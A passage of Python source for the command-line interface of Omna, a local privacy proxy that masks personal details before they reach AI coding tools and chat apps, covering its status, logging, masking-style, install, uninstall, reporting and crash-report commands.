        d = datetime.strptime(str(ts), "%Y-%m-%dT%H:%M:%S%z")
    except ValueError:
        return str(ts)[:16]
    return d.strftime("%b %-d, %-I:%M %p")


def _n(x: int) -> str:
    return f"{x:,}"


def _menu_bar_running() -> bool:
    """Is the Omna menu-bar icon running (it ends a Pause by itself)?"""
    r = subprocess.run(["pgrep", "-f", r"/bin/omna menubar$|Contents/MacOS/omna-menubar$"],
                       capture_output=True, text=True)
    return bool(r.stdout.strip())


def _system_door_on() -> None:
    """`omna init` sets up Mac-wide masking, so it also opens that door if it
    was switched off in Omna's settings (#41: status told a client "To fix:
    omna init" and nothing in init turned it back on)."""
    pol = Policy.load()
    if not pol.doors.get("system", True):
        pol.doors["system"] = True
        pol.save()


def _private_details_today(todays: list[dict]) -> int:
    """Each private detail once (#41) — the same count as the dashboard and the
    daily count: receipts.details_once."""
    return sum(receipts.details_once(todays).values())


def today_counts() -> tuple[int, int, int]:
    """(messages to AI, blocked by an app that refuses Omna, private details
    hidden) today, from the receipts of every door. `omna status` and the
    menu bar (#44) both show these, so they always agree."""
    from datetime import date

    today = date.today().isoformat()
    todays = [r for r in receipts.tail(0) if str(r.get("ts", "")).startswith(today) and r.get("door") != "control"]
    refused = sum(1 for r in todays if r.get("note") == "tls-refused")
    return sum(1 for r in todays if _is_message(r)), refused, _private_details_today(todays)


# Background requests apps send on their own — never a message (#53).
_BACKGROUND = re.compile(r"^/v1/code/|^/v1/messages/count_tokens|^/api/hatch/vm/wake")


def _is_message(r: dict) -> bool:
    """A receipt for something the person sent to an AI (#53, owner
    2026-11-23: the count climbed "every second when I have not given any
    input"). Not: the sites' own checks, reports and page loads Omna passes
    through, empty requests, and the background pings listed above."""
    note = str(r.get("note") or "")
    # A WebSocket receipt (101) always records 0 bytes (both doors): it is a chat.
    empty = r.get("bytes_in", 1) == 0 and r.get("status") != 101
    if note == "tls-refused" or note.startswith("passthrough-") or empty:
        return False
    return not _BACKGROUND.search(str(r.get("route", "")).split("?", 1)[0])


def cmd_status(a) -> int:
    """The client screen (#41). Owner 2026-11-22: easy to read, "like Apple,
    not Windows". Wording from a fresh client read-through of the real screens:
    never claim protection that is not there, every fix true, fits 80 columns."""
    if getattr(a, "details", False):
        return _status_details(a)
    from .proxy import __version__

    h = _health(a.port)
    pol = Policy.load()
    IND = " " * 19
    rows: list[tuple[str, str, list[str]]] = []       # (mark, name, lines under it)

    def footer(out: list[str]) -> None:
        out += ["", f"  Omna {__version__} · more detail: omna status --details"]

    if not h:
        st = pause.state()
        out: list[str] = []
        cc_on = claude_code.status(claude_code.settings_file("user"))["wired"]
        at = lambda ts: time.strftime("%-I:%M %p", time.localtime(ts))   # noqa: E731
        if st and st.get("until") and (pause.minutes_left() or 0) > 0:
            out += [f"Omna is paused for {pause.minutes_left()} more minutes — nothing is masked",
                    "", "  What you type goes to AI exactly as you wrote it until then."]
            if cc_on:
                out.append("  Claude Code will not work until it is back.")
            if _menu_bar_running():
                out.append(f"  It turns back on by itself at {at(st['until'])}.")
            else:
                out.append("  It will not turn back on by itself (the menu-bar icon is not running).")
            out.append("  To turn it on now: omna start -d")
        elif st and st.get("until"):
            out += [f"Omna's pause ended at {at(st['until'])}, but it did not turn back on", "",
                    "  (the menu-bar icon is not running, so nothing turned it on).",
                    "  What you type goes to AI exactly as you wrote it.",
                    "  To turn it on: omna start -d"]
        else:
            out += ["Omna is OFF — nothing is masked", "",
                    "  What you type goes to AI exactly as you wrote it."]
            if cc_on:
                out.append("  Claude Code will not work until it is on.")
            out.append("  To turn it on: omna start -d")
        footer(out)
        print("\n".join(out))
        return 0

    cc = claude_code.status(claude_code.settings_file("user"))
    fixes: list[str] = []
    INIT = "omna init (asks for your Mac password)"
    rows.append(("✓", "Claude Code", []) if cc["wired"] else ("✗", "Claude Code", ["Not set up"]))
    if not cc["wired"]:
        fixes.append(INIT)
    last = h.get("extension_last_seen")
    if last and (time.time() - last) < 120:
        rows.append(("✓", "Chrome", [f"Omna for Chrome {h.get('extension_version') or ''}".rstrip()]))
    else:
        rows.append(("○", "Chrome", ["Not connected yet. Have Omna for Chrome? Quit and",
                                     "reopen Chrome once. Don't have it? Get it here:",
                                     "@chromewebstore.google.com/detail/omna/nnkjconloimokalfdghmhifcangdbmnc"]))
    if sys.platform == "darwin":
        doors = h.get("doors") or {}
        route = _mac_apps_route()
        if not doors.get("system"):
            rows.append(("✗", "Mac apps", ["Turned off — desktop AI apps go unmasked"]))
            fixes.append(INIT + ",\n" + IND + "then omna stop && omna start -d")
        elif route and not route[1]:
            rows.append(("✗", "Mac apps", [f"Not connected on {route[0]} — desktop AI apps",
                                           "(Claude, ChatGPT) go unmasked"]))
            fixes.append(INIT)
        else:
            rows.append(("✓", "Mac apps", ["Claude, ChatGPT and other AI apps"]))
    if shutil.which("aider"):
        ast = aider.status()
        aw = ast["openai_base"] == f"{config.base_url(a.port)}/v1" or ast["anthropic_base"] == config.base_url(a.port)
        rows.append(("✓", "Aider", []) if aw else ("✗", "Aider", ["Not set up"]))
        aw or fixes.append("omna enable aider")
    if shutil.which("codex"):
        xst = codex.status(codex.settings_file())
        xw = xst["routed"] and xst["base_url"] == f"{config.base_url(a.port)}/v1"
        rows.append(("✓", "Codex", []) if xw else ("✗", "Codex", ["Not set up"]))
        xw or fixes.append("omna enable codex")
    if continue_dev.detected():
        cw = continue_dev.status()["wired"]
        rows.append(("✓", "Continue", []) if cw else ("✗", "Continue", ["Not set up"]))
        cw or fixes.append("omna enable continue")

    off = [name for mark, name, _ in rows if mark == "✗"]
    if not any(mark == "✓" for mark, _, _ in rows):
        out = ["Omna is running, but nothing is protected yet"]
    elif off:
        names = off[0] if len(off) == 1 else ", ".join(off[:-1]) + " and " + off[-1]
        verb = "are" if len(off) > 1 or off[0].endswith("apps") else "is"
        out = [f"Omna is on — but {names} {verb} not protected"]
    else:
        out = ["Omna is on — protecting everything below"]
    out.append("")
    for mark, name, under in rows:
        first = under[0] if under else ""
        out.append(f"  {mark}  {name:<14}{first}".rstrip())
        for more in under[1:]:
            out.append("     " + more[1:] if more.startswith("@") else IND + more)
    # One fix line, each step once (read-through 2: "omna init" was said twice).
    longest = max(fixes, key=len) if fixes else None
    steps = [longest] if longest else []
    steps += [f for f in dict.fromkeys(fixes) if f != longest and not longest.startswith(f)]
    for i, f in enumerate(steps):
        out.append(("  To fix: " if i == 0 else "          ") + f)
    out.append("")

    msgs, refused, details = today_counts()
    line = f"{_n(msgs)} message{'' if msgs == 1 else 's'} to AI · {_n(details)} private detail{'' if details == 1 else 's'} hidden"
    out.append(f"  {'Today':<17}{line}")
    if refused:
        out.append(f"{IND}{_n(refused)} blocked by an app that refuses Omna (see --details)")
    total, bad = receipts.bad_receipts()
    if not total:
        out.append(f"  {'Proof':<17}Nothing yet — a receipt is written for every message")
    elif not bad:
        out.append(f"  {'Proof':<17}{_n(total)} receipt{'' if total == 1 else 's'} on this Mac, none changed ✓")
    else:
        out.append(f"  {'Proof':<17}⚠ {_n(len(bad))} of {_n(total)} receipts don't check out")
        out.append(f"{IND}(first: {_when(bad[0][1])}). All others do. Masking still works.")
    if not pol.reports_enabled:
        out.append(f"{IND}Receipts are off — nothing new is written down")
    failed = h.get("smart_failed") or {}
    if h.get("smart") and not (h.get("smart_models") or []) and failed:
        out.append(f"  {'Smart masking':<17}⚠ Not working — names in sentences go unmasked.")
        out.append(f"{IND}To fix: omna stop && omna start -d")
    elif not h.get("smart"):
        out.append(f"  {'Smart masking':<17}Off — names in sentences are not caught")
        out.append(f"{IND}Turn on: omna smart on")
    if pol.privacy_filter == "on":
        out.append(f"  {'Privacy filter':<17}On — extra name checks")
    else:
        out.append(f"  {'Privacy filter':<17}Off (normal)")
        out.append(f"{IND}For extra name checks: omna privacy-filter on")
    from .engine import registry_status

    if registry_status().get("at_rest") not in ("encrypted", "empty"):
        out.append(f"  {'':<17}⚠ Your real values are NOT encrypted on this Mac")
    out += ["", "  Only the masked message goes to the AI you already use.",
            "  Your content never reaches Omna."]
    footer(out)
    print("\n".join(out))
    return 0

def cmd_log(a) -> int:
    if a.verify:
        ok, n, msg = receipts.verify()
        print(f"{'OK' if ok else 'BROKEN'}: {n} receipts, {msg}")
        return 0 if ok else 1
    rows = receipts.tail(a.n)
    if not rows:
        print("no receipts yet")
        return 0
    if a.json:
        for r in rows:
            print(json.dumps(r, sort_keys=True))
        return 0
    print(f"{'time':<20} {'route':<28} {'st':>3} {'ms':>6}  masked")
    for r in rows:
        ts = str(r.get("ts", ""))[:19].replace("T", " ")
        what = _fmt_counts(r.get('masked') or {})
        note = str(r.get("note") or "")
        if note.startswith("file-not-masked:"):     # something went out unread (#160, finding 7)
            said = "NOT masked: " + receipts.not_masked_words(note)
            what = said if what == "-" or not what else f"{what}  ·  {said}"
        elif note.startswith(("passthrough", "passthrough-nonprompt")):
            what = (what + "  ·  " if what and what != "-" else "") + "sent as it is (not a prompt Omna can read)"
        print(f"{ts:<20} {str(r.get('route',''))[:28]:<28} {r.get('status',''):>3} {r.get('ms',''):>6}  {what}")
    return 0


def cmd_mask(a) -> int:
    # `a.text` is a list (nargs="*") so that `omna mask app NAME` (set an app's
    # policy action to "mask") and the original `omna mask TEXT [--smart] [--counts]`
    # (mask a piece of text) can share one subcommand name — see the report for why.
    args: list[str] = a.text
    if len(args) == 2 and args[0] == "app":
        name = args[1]
        pol = Policy.load()
        pol.set_app(name, "mask")
        _save_policy(pol, a)
        print(f'omna: {name!r} → mask (default: every request from this app is masked)')
        return 0

    from .engine import MaskingSession

    if not args:
        text = sys.stdin.read()
    elif len(args) == 1:
        text = sys.stdin.read() if args[0] == "-" else args[0]
    else:
        text = " ".join(args)
    from .style import REALISTIC, TOKENS

    if a.smart:
        # The smart models count as ready only in the process that loaded them
        # (the proxy does it at start). Without this, --smart silently ran the
        # rules alone every time (Muse QA 2026-11-19). Loading = hash-check the
        # files on disk, or download them on the first run.
        from . import smart as smart_models

        smart_models.download_models()
        if smart_models.mode(True) != "smart":
            print("omna: the smart models could not be loaded — this used fast masking only",
                  file=sys.stderr)
    s = MaskingSession(smart=a.smart)
    r = s.mask_text(text, style=REALISTIC if a.realistic else TOKENS)
    sys.stdout.write(r.masked)
    if not r.masked.endswith("\n"):
        sys.stdout.write("\n")
    if a.counts:
        print(f"masked: {_fmt_counts(r.counts)}", file=sys.stderr)
    return 0


def cmd_style(a) -> int:
    """Show or change how a masked value is WRITTEN.

    Worth a command of its own because the two styles are a safety trade, not a
    preference. A numbered token that is ever left behind is visibly wrong and
    somebody notices. A realistic fake value that is left behind looks like
    ordinary data, nobody notices, and it gets committed to a repository.
    """
    import textwrap

    from .style import REALISTIC, TOKENS, style_for_door, style_for_extension

    def wrapped(text: str, indent: str = "      ") -> str:
        return textwrap.fill(text, 76, initial_indent=indent, subsequent_indent=indent)

    pol = Policy.load()
    doors = (("api", "coding tools (Claude Code, aider, Codex, Continue, VS Code)"),
             ("system", "your browser and the chat websites"),
             ("deep", "a named desktop app (deep capture)"))

    if not a.value:
        print(f"masking style: {pol.style}")
        for door, what in doors:
            d = style_for_door(door, pol.style)
            mark = "   <- refused here" if d.refused else ""
            print(f"  {door + ' door':<13} {what}\n  {'':<13} writes: {d.style}{mark}")
        # The Chrome extension masks inside the browser, before the plugin
        # sees the request at all, so it gets its own line — a person who has
        # both installed needs to know what the browser will actually write.
        ext = style_for_extension(pol.style, pol.doors.get("system", True))
        mark = "   <- refused here" if ext.refused else ""
        print(f"  {'browser ext':<13} the Omna extension, masking inside the browser"
              f"\n  {'':<13} writes: {ext.style}{mark}")
        refusal = style_for_door("api", pol.style)
        if refusal.refused:
            print("\nWhy:")
            print(wrapped(refusal.reason + ".", "  "))
        if ext.refused and ext.requested == REALISTIC:
            print("\nAnd in the browser extension:")
            print(wrapped(ext.reason + ".", "  "))
        print("\n  omna style tokens      a numbered token, everywhere (the default)")
        print("  omna style realistic   a realistic fake value instead — browser only")
        return 0

    pol.style = a.value
    _save_policy(pol, a)
    if a.value == TOKENS:
        print("omna: masking style is now numbered tokens, at every door.")
        print("      Values already masked keep whichever stand-in they were given,")
        print("      so replies about them still come back right.")
        return 0

    print("omna: masking style is now realistic fake values.")
    print("      Where: the system door only — your browser and the chat websites.")
    print("      An e-mail is sent as something like robert.jones@example.org")
    print("      instead of a numbered token, which reads better to the AI.")
    print("      NOT here:")
    print(wrapped(style_for_door("api", REALISTIC).reason + ".", "        "))
    ext = style_for_extension(REALISTIC, pol.doors.get("system", True))
    if ext.refused:
        print("      NOT in the Omna browser extension either, right now:")
        print(wrapped(ext.reason + ".", "        "))
    print("      Why: a leftover token is obviously wrong and someone notices;")
    print("      a leftover fake value looks like real data and gets committed.")
    print("      Secrets are never faked, under any style — a fake API key that")
    print("      looked real would be the worst thing Omna could hand you.")
    if not pol.restore_browser:
        print("\nomna: restore in the browser is OFF, so YOU will read the fake values")
        print("      too, and they will look real to you. Turn on \"Restore on reply")
        print("      (shield mode)\" in the menu bar if that is not what you want.")
    return 0


def cmd_allow(a) -> int:
    from .engine import MaskingSession

    MaskingSession().allow(a.value)
    print(f"omna: will not mask {a.value!r} again (ruleset {config.ruleset_path()}). Restart the proxy to apply.")
    return 0


def cmd_mask_always(a) -> int:
    from .engine import MaskingSession

    if not re.fullmatch(r"[A-Z][A-Z_]*", a.label):
        print(f"omna: --label must be capital letters and _ only, like CLIENT or PROJECT_NAME (got {a.label!r})", file=sys.stderr)
        return 2
    value = a.value.strip()
    if len(value) < 2:
        print("omna: mask-always needs a value of at least 2 characters, e.g. omna mask-always \"Acme Corp\"", file=sys.stderr)
        return 2
    try:
        MaskingSession().mask_always(value, a.label)
    except ValueError as e:
        print(f"omna: {config.ruleset_path()} cannot be read ({e}); nothing changed. Fix or remove that file, then try again", file=sys.stderr)
        return 1
    print(f"omna: will always mask {value!r} as [{a.label}_n], any capitalisation (ruleset {config.ruleset_path()}). "
          "Restart the proxy to apply.")
    return 0


def cmd_forget(a) -> int:
    from .engine import MaskingSession

    MaskingSession().forget()
    print("omna: token registry wiped, and its key removed from your Keychain. The running curl command forgets too, on its next request.")
    return 0


def _auto_wire_other_tools(port: int) -> None:
    """Wire aider and Codex CLI too, but only if they're actually installed —
    `omna init` shouldn't scatter config files for tools the person doesn't use.
    Never let one tool's failure (e.g. a read-only config file) stop `omna init`
    before it reaches the Mac system-proxy + certificate setup that follows."""
    if shutil.which("aider"):
        try:
            ch = aider.init(port)
            bits = []
            if ch["openai_base"]:
                bits.append(f"openai-api-base in {aider.conf_file()}")
            if ch["anthropic_base"]:
                bits.append(f"ANTHROPIC_BASE_URL in {aider.env_file()}")
            if bits:
                print(f"omna: aider wired — {' · '.join(bits)}")
        except OSError as e:
            print(f"omna: WARNING — could not wire aider ({e}); everything else continues")
    if shutil.which("codex"):
        try:
            ch = codex.init(codex.settings_file(), port)
            if ch["base_url"]:
                print(f"omna: Codex CLI wired via {codex.settings_file()}")
            elif ch.get("problem"):
                print(f"omna: WARNING — Codex CLI NOT wired: {ch['problem']}")
            xst = codex.status(codex.settings_file())
            if xst["base_url"] == f"{config.base_url(port)}/v1" and not xst["routed"]:
                print(f"omna: WARNING — Codex CLI is NOT protected: {xst['problem']}")
        except OSError as e:
            print(f"omna: WARNING — could not wire Codex CLI ({e}); everything else continues")
    if continue_dev.detected():
        try:
            ch = continue_dev.init(port)
            if ch["models_wired"]:
                print(f"omna: Continue wired — {', '.join(ch['models_wired'])} in {continue_dev.config_file()}")
        except OSError as e:
            print(f"omna: WARNING — could not wire Continue ({e}); everything else continues")


def cmd_init(a) -> int:
    path = claude_code.settings_file("project" if a.project else "user")
    via_system = sys.platform == "darwin" and not a.no_system
    ch = claude_code.init(path, a.port, system=via_system)
    print(f"omna: Claude Code wired via {path}")
    if ch["backup"]:
        print(f"      backup of your previous settings: {ch['backup']}")
    if claude_code.status(path)["via_system"]:
        print("      through the Mac-wide setting, so Claude Code's Remote Control keeps working  ·  SessionStart hook `omna ensure`")
    else:
        print(f"      env {claude_code.ENV_KEY}={config.base_url(a.port)}  ·  SessionStart hook `omna ensure`")
    _auto_wire_other_tools(a.port)
    _pair_chrome()
    print("      other tools: export ANTHROPIC_BASE_URL / OPENAI_BASE_URL to the same address (Cursor BYOK, SDKs).")
    if a.no_system:
        print("      Mac system proxy + certificate: skipped (--no-system) — Claude Code only.")
    elif sys.platform == "darwin":
        from .mac import setup as mac_setup

        _system_door_on()
        res = mac_setup.apply(api_port=a.port)
        if res.get("sudo_rc", 0) != 0:
            # #50: no terminal for the password, wrong password, or cancelled.
            # Nothing was installed, so nothing on this Mac is masked yet —
            # Claude Code included, since it goes through the same Mac-wide door.
            print("omna: NOT finished — the Mac password step did not complete, so nothing is masked yet.")
            print("      Open the Terminal app, run `omna init`, and type your Mac password when asked.")
            return 1
        print("      Mac: system proxy + certificate installed — every AI app on this Mac is masked, not just Claude Code.")
        print("      Mac: a menu-bar icon now shows Omna's status — click it any time to see what's covered, or to uninstall.")
        print("      Mac: quit the icon any time and re-open \"Omna Plugin\" from Spotlight — turn on its Launch at Login to skip that step.")
        vs = res.get("vscode")
        if vs is not None:
            skip = vs.get("skipped")
            if vs.get("proxy") and not skip:
                print("      Mac: VS Code wired too — Copilot Chat, Cline, and similar extensions are masked.")
            elif skip:
                print(f"      Mac: WARNING — VS Code was NOT fully wired ({skip}); its AI chat may not be masked.")
    # Printed whether the Mac setup just ran or was intentionally skipped (--no-system
    # or a non-Mac platform); Claude Code is wired either way, which is the sense in
    # which Omna is "active" here.
    print("Omna is active. Everything you send to an AI from this Mac is masked. `omna status` any time.")
    from . import installping

    if installping.send_install():
        print("      counted one install at omna.dev (a random id + version, nothing else). "
              "Off: OMNA_NO_TELEMETRY=1.")
    return 0


def cmd_menubar(a) -> int:
    from . import menubar

    return menubar.run(a.port)


def _remove_local_state() -> str | None:
    """Stop the proxy and delete everything Omna keeps on this computer
    (registry, receipts, settings, keys). Used where there is no Mac set-up
    to revert: uninstall used to leave all of it — the proxy still running,
    and registry.json with its real values still on disk — on Linux and
    Windows. Returns an error text when the folder could not be deleted."""
    from . import vault

    try:
        pid = int(config.pid_path().read_text().strip() or 0)
    except (OSError, ValueError):
        pid = 0
    if pid:
        try:
            os.kill(pid, signal.SIGTERM)
        except (ProcessLookupError, PermissionError):
            pass
        deadline = time.monotonic() + 2.0
        while time.monotonic() < deadline:
            try:
                os.kill(pid, 0)
            except (ProcessLookupError, PermissionError):
                break
            time.sleep(0.05)
    error = None
    home = config.home()
    if home.exists():
        try:
            shutil.rmtree(home)
        except OSError as e:
            error = str(e)
    vault.delete_key(vault.ACCOUNT)
    vault.delete_key(vault.RECEIPTS_ACCOUNT)
    return error


def _save_receipts_before_uninstall() -> None:
    """Copy receipts.jsonl to the home folder before ~/.omna is deleted (Muse QA
    2026-11-17: uninstall silently deleted the receipts, the proof a buyer pays
    for). Receipts hold counts only, never a real value, so the copy is safe to
    keep."""
    src = config.receipts_path()
    try:
        if not src.exists() or src.stat().st_size == 0:
            return
        import shutil
        import time as _time

        dst = Path.home() / f"omna-receipts-{_time.strftime('%Y-%m-%d-%H%M%S')}.jsonl"
        shutil.copy2(src, dst)
        print(f"omna: your receipts saved to {dst} (counts only, no real values) — "
              "keep it as proof of what Omna masked, or delete it.")
    except OSError as e:
        print(f"omna: WARNING — could not save a copy of your receipts ({e}); they are deleted with {config.home()}.")


def cmd_uninstall(a) -> int:
    # Both places `omna init` can have wired (it is run once per user, and
    # again with --project in a repo): un-wiring only the one named on this
    # command line left the other pointing at a proxy that is about to go.
    paths = [claude_code.settings_file("user")]
    project = claude_code.settings_file("project")
    if project not in paths and (a.project or project.exists() or project.with_name(project.name + ".omna-backup").exists()):
        paths.append(project)
    for path in paths:
        ch = claude_code.uninstall(path)
        print(f"omna: removed {'env var ' if ch['env'] else ''}{'hook ' if ch['hook'] else ''}{'backup file ' if ch['backup'] else ''}from {path}" if any(ch.values()) else f"omna: nothing to remove in {path}")
    ach = aider.uninstall()
    if ach["openai_base"] or ach["anthropic_base"]:
        print(f"omna: removed aider's Omna settings from {aider.conf_file()} / {aider.env_file()}")
    cch = codex.uninstall(codex.settings_file())
    if cch["base_url"]:
        print(f"omna: removed Codex CLI's Omna setting from {codex.settings_file()}")
    gone = extension_auth.unregister()
    if gone:
        print(f"omna: removed Omna for Chrome's channel from {len(gone)} browser(s)")
    xch = continue_dev.uninstall()
    if xch["models_unwired"]:
        print(f"omna: removed Continue's Omna setting from {', '.join(xch['models_unwired'])}")
    _save_receipts_before_uninstall()
    # Before ~/.omna (which holds the install id) is deleted below.
    from . import installping

    installping.send_uninstall()
    rc = 0
    if sys.platform == "darwin":
        from .mac import setup as mac_setup

        res = mac_setup.revert()
        print("      Mac: menu-bar app and Launch at Login removed.")
        # Say "removed" only for what was read back as gone (#49): the admin
        # step can fail partway, and it used to be reported as done anyway.
        proxy_left, cert_left = res.get("proxy_left", []), res.get("cert_left", False)
        if not proxy_left and not cert_left:
            print("      Mac: system proxy + certificate removed.")
        else:
            rc = 1
            from .mac import certs, netproxy

            for s in proxy_left:
                print(f"      Mac: WARNING — network service \"{s}\" still has Omna's system proxy setting on. Remove it by hand:")
                for line in netproxy.pac_off_commands([s]):
                    print(f"        sudo {line}")
            if cert_left:
                print(f"      Mac: WARNING — \"{certs.CA_NAME}\" is still in the System keychain. Remove it by hand:")
                print(f"        sudo {certs.delete_command()}")
        if not res.get("home_removed", True):
            print(f"      Mac: WARNING — could not delete {config.home()} ({res['home_error']}); "
                  f"registry/receipts may still hold real values, remove it by hand.")
    else:
        err = _remove_local_state()
        if err:
            print(f"omna: WARNING — could not delete {config.home()} ({err}); "
                  f"registry/receipts may still hold real values, remove it by hand.")
        else:
            print(f"omna: stopped, and {config.home()} (registry, receipts, settings) deleted.")
    # The one thing this command cannot do is delete the program it is.
    print("omna: Omna no longer masks anything on this computer. To remove the program itself: "
          "`brew uninstall omna` if you installed it with Homebrew, otherwise `uv tool uninstall omna-plugin`.")
    return rc


def cmd_tools(a) -> int:
    pol = Policy.load()
    if not pol.tools:
        print("omna: no tools configured")
        return 0
    for name, state in sorted(pol.tools.items()):
        print(f"{name:<15} {state}")
    return 0


def _set_tool(a, state: str) -> int:
    pol = Policy.load()
    pol.tools[a.tool] = state
    if a.tool == "claude-code":
        path = claude_code.settings_file("user")
        if state == "on":
            claude_code.init(path, a.port, system=sys.platform == "darwin" and bool(pol.doors.get("system")))
        else:
            claude_code.uninstall(path)
    elif a.tool == "aider":
        if state == "off":
            aider.uninstall()
        elif shutil.which("aider"):
            aider.init(a.port)
        else:
            print("omna: aider not found on PATH — install it first, then `omna enable aider`")
            return 1
    elif a.tool == "codex":
        path = codex.settings_file()
        if state == "off":
            codex.uninstall(path)
        elif shutil.which("codex"):
            ch = codex.init(path, a.port)
            xst = codex.status(path)
            if ch.get("problem") or not xst["routed"]:
                print(f"omna: WARNING — Codex CLI is NOT protected: {ch.get('problem') or xst['problem']}")
        else:
            print("omna: codex not found on PATH — install it first, then `omna enable codex`")
            return 1
    elif a.tool == "continue":
        if state == "off":
            continue_dev.uninstall()
        elif continue_dev.detected():
            continue_dev.init(a.port)
        else:
            print(f"omna: no Continue config found at {continue_dev.config_file()} — "
                  f"run Continue at least once (it creates this file itself), then `omna enable continue`")
            return 1
    _save_policy(pol, a)
    print(f"omna: {a.tool} → {state}")
    return 0


def cmd_enable(a) -> int:
    return _set_tool(a, "on")


def cmd_disable(a) -> int:
    return _set_tool(a, "off")


def cmd_apps(a) -> int:
    pol = Policy.load()
    if not pol.apps:
        print("omna: no apps configured (default action for every app is mask)")
        return 0
    for name, action in sorted(pol.apps.items()):
        print(f"{name:<24} {action}")
    return 0


def cmd_bypass(a) -> int:
    pol = Policy.load()
    pol.set_app(a.name, "bypass")
    _save_policy(pol, a)
    print(f'omna: {a.name!r} → bypass (never masked; still receipted)')
    return 0


def cmd_capture(a) -> int:
    pol = Policy.load()
    if a.name not in pol.deep_apps:
        pol.deep_apps.append(a.name)
    pol.doors["deep"] = True
    _save_policy(pol, a)
    print(f'omna: {a.name!r} → deep capture (Stage 3)')
    return 0


def cmd_hosts(a) -> int:
    pol = Policy.load()
    if a.action is None:
        for h in pol.hosts:
            print(h)
        return 0
    if not a.host:
        print("omna: `omna hosts add|remove HOST` needs a HOST", file=sys.stderr)
        return 1
    if a.action == "add":
        pol.add_host(a.host)
        _save_policy(pol, a)
        print(f"omna: added {a.host}")
    else:
        pol.remove_host(a.host)
        _save_policy(pol, a)
        print(f"omna: removed {a.host}")
    return 0


def cmd_enroll(a) -> int:
    pol = Policy.load()
    if a.forget:
        pol.unenroll()
        pol.save()
        print("omna: this machine is no longer tagged with an organisation or department.")
        return 0
    if not a.org and not a.dept:
        if pol.org or pol.dept:
            print(f"organisation: {pol.org or '(none)'}")
            print(f"department:   {pol.dept or '(none)'}")
            print(f"device id:    {pol.device_id or '(none)'}")
        else:
            print("omna: this machine is not enrolled.")
            print("  omna enroll --org \"Acme Inc\" --dept engineering")
        return 0
    pol.enroll(org=a.org or "", dept=a.dept or "")
    pol.save()
    print(f"omna: enrolled as {pol.org or '(no org)'} / {pol.dept or '(no department)'} (device {pol.device_id}).")
    print("  Nothing is sent anywhere. `omna report --export FILE` writes a counts-only file you can hand in.")
    return 0


def cmd_dashboard(a) -> int:
    """Open the live dashboard in the browser. The daemon serves it, so it has
    to be running — say so plainly rather than opening a dead tab."""
    import webbrowser

    if not _health(a.port):
        print(f"omna: the proxy isn't running, so there's nothing to show yet.", file=sys.stderr)
        print("  start it with `omna start -d`, then run this again.", file=sys.stderr)
        return 1
    # The dashboard is token-protected (#134). The token lives in a 0600 file,
    # so this command is the easy path and reading the file is the manual one.
    url = f"{config.base_url(a.port)}/omna/dashboard#k={config.dashboard_token()}"
    print(f"omna: opening the dashboard on {config.base_url(a.port)}")
    if not webbrowser.open(url):
        print(f"  (couldn't open a browser — paste this in yourself: {url})")
    return 0


def cmd_mappings(a) -> int:
    """Open the Mappings Review screen in the browser — every value Omna has
    masked, real values hidden until clicked. Same token as the dashboard."""
    import webbrowser

    if not _health(a.port):
        print(f"omna: the proxy isn't running, so there's nothing to show yet.", file=sys.stderr)
        print("  start it with `omna start -d`, then run this again.", file=sys.stderr)
        return 1
    url = f"{config.base_url(a.port)}/omna/mappings#k={config.dashboard_token()}"
    print(f"omna: opening the mappings review screen on {config.base_url(a.port)}")
    if not webbrowser.open(url):
        print(f"  (couldn't open a browser — paste this in yourself: {url})")
    return 0


def cmd_report(a) -> int:
    from . import report

    if getattr(a, "merge", None):
        shares = []
        for path in a.merge:
            try:
                shares.append(json.loads(Path(path).read_text()))
            except FileNotFoundError:
                print(f"omna: no such file: {path}", file=sys.stderr)
                return 1
            except json.JSONDecodeError as e:
                print(f"omna: {path} is not valid JSON ({e})", file=sys.stderr)
                return 1
        try:
            merged = report.merge(shares)
        except ValueError as e:
            print(f"omna: {e}", file=sys.stderr)
            return 1
        print(report.to_json(merged) if a.json else report.render_merge_text(merged))
        return 0

    d = report.build(days=a.days)
    if getattr(a, "export", None):
        payload = report.share(d)
        if not payload["org"] and not payload["dept"]:
            print(
                "omna: this machine isn't enrolled, so the export has no organisation or department.\n"
                "  Run `omna enroll --org \"Acme Inc\" --dept engineering` first if it should be grouped.",
                file=sys.stderr,
            )
        Path(a.export).write_text(report.to_json(payload) + "\n")
        print(f"omna: counts-only export written to {a.export}")
        return 0
    if a.json:
        print(report.to_json(d))
        return 0
    if a.html:
        page = report.render_html(d)
        with open(a.html, "w", encoding="utf-8") as f:
            f.write(page)
        print(f"omna: report written to {a.html}")
        return 0
    print(report.render_text(d))
    return 0


def cmd_crash(a) -> int:
    """What broke on THIS machine, and who (if anyone) has seen it.

    The local copy is always the source of truth: sending never deletes it, so
    the person can check afterwards exactly what left.
    """
    from . import crashsend

    if a.always or a.never:
        crashlog.remember_choice(bool(a.always))
        if a.always:
            n = crashsend.send_pending()
            print(f"omna: crash reports will be sent automatically."
                  + (f" Sent {n} pending." if n else ""))
        else:
            print("omna: crash reports will never be sent. They stay in "
                  f"{crashlog.path()} for you to read.")
        return 0

    if a.clear:
        crashlog.clear()
        print("omna: crash log cleared.")
        return 0

    rows = crashlog.tail(200)
    if not rows:
        print("omna: no crashes recorded. Nothing has been sent anywhere.")
        return 0

    if a.show or a.issue:
        n = a.show or len(rows)
        if not 1 <= n <= len(rows):
            print(f"omna: there are {len(rows)} crashes; pick 1..{len(rows)}", file=sys.stderr)
            return 1
        row = rows[n - 1]
        if a.issue:
            url = crashlog.issue_url(row)
            print("omna: this opens a GitHub issue pre-filled with the report below.")
            print("      It is already masked, and it is exactly what you see here — nothing")
            print("      is collected again at send time. Close the tab to send nothing.\n")
            _print_crash(row)
            if sys.platform == "darwin":
                subprocess.run(["open", url], check=False)
                print("\nomna: opened your browser. Review it before you submit.")
            else:
                print(f"\n{url}")
            return 0
        _print_crash(row)
        return 0

    if a.send:
        pending = crashlog.unsent()
        if not pending:
            print("omna: nothing pending — everything here has already been sent.")
            return 0
        n = crashsend.send_now(pending)
        if n:
            print(f"omna: sent {n} report(s). Your local copy is unchanged — `omna crash` still shows them.")
            return 0
        print("omna: could not reach omna.dev; nothing was sent. It stays pending and will retry.",
              file=sys.stderr)
        return 1

    print(f"{'#':>3}  {'when':<20} {'where':<12} {'sent':<5} what")
    for i, r in enumerate(rows, 1):
        ts = str(r.get("ts", ""))[:19].replace("T", " ")
        sent = "yes" if r.get("sent") else "no"
        print(f"{i:>3}  {ts:<20} {str(r.get('where',''))[:12]:<12} {sent:<5} {r.get('error','')}")

    pol = Policy.load()
    setting = {"on": "sent automatically", "off": "never sent",
               "unset": "not sent — you have not been asked yet"}[pol.crash_reports]
